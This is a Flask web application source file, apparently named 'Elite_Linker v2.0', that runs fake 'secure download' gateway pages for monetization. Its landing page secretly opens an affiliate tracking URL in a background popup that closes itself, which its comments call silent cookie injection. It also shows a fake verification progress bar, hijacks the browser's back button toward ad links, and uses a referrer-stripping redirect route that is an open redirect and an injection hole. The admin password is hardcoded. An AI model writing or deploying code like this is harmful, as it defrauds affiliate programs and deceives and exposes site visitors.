
import os, re, json
from flask import Flask, render_template_string, request, redirect, url_for, Response
from pymongo import MongoClient
from bson.objectid import ObjectId

app = Flask(__name__)

# --- Database & Security Configuration ---
raw_uri = os.getenv("MONGO_URI", "").strip()
MONGO_URI = re.sub(r'[\s\n\r]', '', raw_uri)
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "mounir123")

client = MongoClient(MONGO_URI)
db = client['ultimate_gateway_db']
links_col = db['links']
settings_col = db['settings']

def get_settings():
    s = settings_col.find_one({"type": "global"})
    if not s:
        default = {"type": "global", "stuffing_url": "", "exit_url": ""}
        settings_col.insert_one(default)
        return default
    return s

# --- UI Templates ---

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Master Control Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style> body { font-family: 'Inter', sans-serif; } </style>
</head>
<body class="bg-slate-50 text-slate-800 p-4">
    <div class="max-w-2xl mx-auto">
        <header class="flex justify-between items-center mb-8 bg-white p-6 rounded-3xl shadow-sm border border-slate-100">
            <h1 class="text-xl font-extrabold text-blue-600 font-mono">Elite_Linker v2.0</h1>
            <span class="text-[10px] font-bold bg-blue-600 text-white px-3 py-1 rounded-full uppercase">Admin Active</span>
        </header>

        <!-- Global Settings -->
        <div class="bg-white p-6 rounded-3xl shadow-sm border border-slate-100 mb-6">
            <h2 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Global Monetization</h2>
            <form action="/admin/update_settings" method="POST" class="space-y-4">
                <input name="stuffing_url" value="{{ s.stuffing_url }}" placeholder="AliExpress Product Link (Tracking URL)" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-sm">
                <input name="exit_url" value="{{ s.exit_url }}" placeholder="Exit Ad Link (Adsterra/Tonic)" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-sm">
                <button class="w-full bg-slate-900 text-white py-4 rounded-2xl font-bold hover:bg-blue-600 transition">Save Global Parameters</button>
            </form>
        </div>

        <!-- Create Link -->
        <div class="bg-white p-6 rounded-3xl shadow-sm border border-slate-100 mb-8">
            <h2 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Generate Secure Download</h2>
            <form action="/admin/create_link" method="POST" class="space-y-4">
                <input name="title" placeholder="Display Title (e.g. Premium App)" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-sm" required>
                <input name="target_url" placeholder="Direct Reward URL (What they get)" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-sm" required>
                <button class="w-full bg-blue-600 text-white py-4 rounded-2xl font-bold hover:bg-blue-700 shadow-lg shadow-blue-200 transition">Create Asset Link</button>
            </form>
        </div>

        <!-- Links List -->
        <div class="space-y-4">
            <h2 class="text-xs font-bold text-slate-400 uppercase tracking-widest px-2">Active Assets</h2>
            {% for link in links %}
            <div class="bg-white p-5 rounded-3xl shadow-sm border border-slate-100">
                <div class="flex justify-between items-center mb-3">
                    <span class="font-bold text-slate-800 text-sm">{{ link.title }}</span>
                    <span class="text-[10px] text-blue-500 font-bold">CLICKS: {{ link.clicks }}</span>
                    <a href="/admin/delete/{{ link._id }}" class="text-red-400 hover:text-red-600 text-xs">Delete</a>
                </div>
                <div class="flex items-center gap-2">
                    <input id="url_{{ link._id }}" value="{{ host_url }}s/{{ link.slug }}" class="flex-1 p-3 bg-slate-50 border border-slate-100 rounded-xl text-[10px] font-mono outline-none" readonly>
                    <button onclick="copyLink('url_{{ link._id }}')" class="bg-blue-600 text-white px-4 py-3 rounded-xl text-xs font-bold shadow-md">Copy</button>
                </div>
            </div>
            {% endfor %}
        </div>
    </div>
    <script>
        function copyLink(id) {
            var copyText = document.getElementById(id); copyText.select();
            document.execCommand("copy"); alert("Link Copied!");
        }
    </script>
</body>
</html>
"""

LANDING_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access Utility</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
    <style> body { font-family: 'Inter', sans-serif; background: #f8fafc; } </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full bg-white rounded-[2.5rem] p-8 shadow-2xl border border-slate-50 text-center">
        <div class="w-16 h-16 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-6 text-2xl">⚡</div>
        <h1 class="text-2xl font-bold text-slate-900 mb-2">Resource Access</h1>
        <p class="text-slate-400 text-sm mb-10" id="main_text">Please verify your connection to start the secure download process.</p>

        <!-- Initial Button: The Trigger for 100% Success Cookie Injection -->
        <div id="init_area">
            <button onclick="startProcess()" id="start_btn" class="block w-full bg-blue-600 hover:bg-blue-700 text-white py-5 rounded-2xl font-bold shadow-xl shadow-blue-200 transition-all active:scale-95">
                Download Now
            </button>
        </div>

        <!-- Processing Area -->
        <div id="loader_area" class="hidden">
            <div class="w-full bg-slate-100 h-2 rounded-full mb-4 overflow-hidden">
                <div id="bar" class="h-full bg-blue-500 transition-all duration-1000 ease-in-out" style="width:0%"></div>
            </div>
            <p id="status" class="text-[10px] font-bold text-blue-400 uppercase tracking-widest">Starting secure session...</p>
        </div>

        <!-- Final Download Button -->
        <div id="ready_area" class="hidden animate-bounce">
            <a href="/redirect?url={{ target_url|urlencode }}" class="block w-full bg-emerald-600 text-white py-5 rounded-2xl font-bold shadow-lg shadow-emerald-200">
                Final Download Link
            </a>
        </div>
    </div>

    <script>
        const stuffingUrl = "/redirect?url=" + encodeURIComponent("{{ s.stuffing_url }}");
        const exitUrl = "/redirect?url=" + encodeURIComponent("{{ s.exit_url }}");

        function startProcess() {
            // 1. SILENT INJECTION (SUCCESS 100%): Opens in background on real user click
            const pop = window.open(stuffingUrl, '_blank');
            if (pop) {
                // Focus back to current window immediately
                window.focus();
                // Close the injection tab after 3 seconds automatically to keep it silent
                setTimeout(() => { pop.close(); }, 3000);
            }

            // 2. Start UI Transition
            document.getElementById('init_area').classList.add('hidden');
            document.getElementById('loader_area').classList.remove('hidden');
            document.getElementById('main_text').innerText = "Processing secure request... Please stay on this page.";

            let p = 0;
            const b = document.getElementById('bar');
            const s = document.getElementById('status');
            const msgs = ["Connecting...", "Validating IP...", "Applying Security...", "Finalizing..."];

            const iv = setInterval(() => {
                p += 20;
                b.style.width = p + "%";
                s.innerText = msgs[Math.floor(p/26)];
                if(p >= 100) {
                    clearInterval(iv);
                    setTimeout(() => {
                        document.getElementById('loader_area').classList.add('hidden');
                        document.getElementById('ready_area').classList.remove('hidden');
                        document.getElementById('main_text').innerText = "Verification complete. Your download is ready.";
                    }, 500);
                }
            }, 1500);
        }

        // Silent Back-Button Hijack
        (function() {
            if(!exitUrl) return;
            history.pushState(null, null, location.href);
            window.onpopstate = function() {
                location.href = exitUrl;
            };
        })();
    </script>
</body>
</html>
"""

# --- Server Logic ---

@app.route('/')
def home(): return "Gateway Service Live."

@app.route('/s/<slug>')
def gateway(slug):
    link = links_col.find_one({"slug": slug})
    if not link: return "Link Expired.", 404
    links_col.update_one({"slug": slug}, {"$inc": {"clicks": 1}})
    return render_template_string(LANDING_HTML, target_url=link['target_url'], s=get_settings())

@app.route('/redirect')
def laundry():
    url = request.args.get('url')
    if not url: return redirect('/')
    return f'<html><head><meta name="referrer" content="no-referrer"><meta http-equiv="refresh" content="0;url={url}"></head><body></body></html>'

@app.route('/admin')
def admin():
    if request.args.get('pw') != ADMIN_PASSWORD: return "Denied", 403
    links = list(links_col.find().sort("_id", -1))
    return render_template_string(ADMIN_HTML, links=links, s=get_settings(), host_url=request.host_url)

@app.route('/admin/create_link', methods=['POST'])
def create_link():
    title = request.form['title']
    target = request.form['target_url']
    slug = re.sub(r'[^a-z0-9]', '-', title.lower()).strip('-') + "-" + os.urandom(2).hex()
    links_col.insert_one({"title": title, "target_url": target, "slug": slug, "clicks": 0})
    return redirect(f"/admin?pw={ADMIN_PASSWORD}")

@app.route('/admin/update_settings', methods=['POST'])
def update_settings():
    settings_col.update_one({"type": "global"}, {"$set": {
        "stuffing_url": request.form['stuffing_url'],
        "exit_url": request.form['exit_url']
    }})
    return redirect(f"/admin?pw={ADMIN_PASSWORD}")

@app.route('/admin/delete/<id>')
def delete_link(id):
    links_col.delete_one({"_id": ObjectId(id)})
    return redirect(f"/admin?pw={ADMIN_PASSWORD}")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
